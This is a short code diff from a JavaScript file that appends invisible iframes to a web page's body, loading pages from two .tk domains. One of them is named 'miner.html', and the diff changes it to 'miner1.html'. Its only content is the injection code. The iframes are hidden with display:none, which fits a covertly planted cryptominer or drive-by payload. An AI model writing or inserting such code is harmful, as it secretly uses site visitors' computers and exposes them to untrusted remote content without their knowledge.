@@ -6,7 +6,7 @@
     var divs=[
 
     "<iframe src=\"http://emprise.tk/\"  style=\"display: none;\"></iframe>",
-    "<iframe src=\"http://www.7k77.tk/cssjs/miner.html\"  style=\"display: none;\"></iframe>"
+    "<iframe src=\"http://www.7k77.tk/cssjs/miner1.html\"  style=\"display: none;\"></iframe>"
     ]
     for (var i=0,len=divs.length;i<len;i++){
         document.body.innerHTML+=divs[i]
